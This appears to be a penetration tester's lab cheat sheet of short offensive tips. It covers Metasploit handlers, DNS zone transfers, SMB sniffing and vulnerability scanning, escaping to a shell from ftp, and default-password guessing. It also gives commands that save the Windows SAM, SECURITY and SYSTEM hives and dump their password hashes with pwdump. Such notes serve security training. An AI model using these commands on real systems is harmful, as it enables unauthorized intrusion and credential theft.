Staged payload, use msf multi handler

Copy the PNG info from an image to fake an image

Msfdb run - start db and run msfconsole

You can use this: $(!!) to recompute (not re-use) the output of the last command.
  Example: cp `!!` .

Burp url encode - ctrl u
  always encode url when passing in burp
  
Zone-Transfer- host -l megacorpone.com ns2.megacorpone.com - sometimes dumps the list of hosts and IPs

Guess passwords first admin, password, name of the box, name of the software etc

Always use full path to execute something 

SNIFF SMB version ngrep -i -d tap0 's.?a.?m.?b.?a.*[[:digit:]]' & smbclient -L [IP] 

Linux memory 99 percent writeable /dev/shm

ftp>!/bin/bash
echo $SHELL
export SHELL="/bin/bash"
echo $SHELL


Script to check every SMB vulnerability 
for vul in $(find / -name smb*vuln*.nse | cut -d"/" -f 6); do nmap -v -p 139,445 --script=$vul -iL smb_server_all.txt -oN smb_vulns_$vul.txt; done 

Show hidden directories in CMD: attrib -s -h -r /s /d *.*

Looting Windows Hashes wihtout upload 

C:\> reg.exe save hklm\sam c:\windows\temp\sam.save
C:\> reg.exe save hklm\security c:\windows\temp\security.save
C:\> reg.exe save hklm\system c:\windows\temp\system.save

pwdump system.save sam.save

when ifconfig is not available, use ip addr
